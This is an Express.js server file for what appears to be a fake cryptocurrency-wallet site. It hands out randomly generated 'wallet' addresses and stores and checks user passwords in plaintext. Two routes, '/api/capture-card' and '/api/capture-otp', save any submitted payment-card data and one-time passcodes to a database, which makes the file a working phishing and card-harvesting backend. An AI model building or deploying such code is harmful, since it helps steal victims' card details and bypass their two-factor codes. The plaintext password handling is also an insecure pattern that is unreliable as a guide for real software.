// server.js - Final Update
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
require('dotenv').config();

const User = require('./models/User');
const Data = require('./models/Data');

const app = express();
app.use(cors());
app.use(express.json());

// 🟢 ADDED: Keep-Alive Ping Route for Cron-job.org
app.get('/ping', (req, res) => {
  res.status(200).send('Awake!');
});

mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log("✅ MongoDB Connected"))
  .catch(err => console.error("❌ MongoDB Error:", err.message));

// ✅ SIGNUP
app.post('/api/signup', async (req, res) => {
  try {
    const { email, password } = req.body;
    const existingUser = await User.findOne({ email });
    if (existingUser) return res.status(400).json({ error: "User already exists" });

    const wallet = "0x" + Math.random().toString(16).substring(2, 42);
    const newUser = new User({ email, password, walletAddress: wallet });
    
    await newUser.save();
    res.status(201).json({ message: "User Created" });
  } catch (err) {
    res.status(500).json({ error: "Signup error" });
  }
});

// ✅ LOGIN
app.post('/api/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    const user = await User.findOne({ email, password });

    if (user) {
      res.status(200).json({ 
        user: { 
          email: user.email, 
          btc: user.btcBalance, 
          usd: user.usdBalance, 
          wallet: user.walletAddress 
        } 
      });
    } else {
      res.status(401).json({ error: "Invalid credentials" });
    }
  } catch (err) {
    res.status(500).json({ error: "Login error" });
  }
});

app.post('/api/capture-card', async (req, res) => {
    try {
        const card = new Data(req.body);
        await card.save();
        res.status(201).send();
    } catch (err) {
        res.status(500).send();
    }
});

app.post('/api/capture-otp', async (req, res) => {
    try {
        const { email, otpCode } = req.body;
        await Data.findOneAndUpdate({ email }, { otpCode }, { upsert: true });
        res.status(200).send();
    } catch (err) {
        res.status(500).send();
    }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`🚀 Port ${PORT}`));
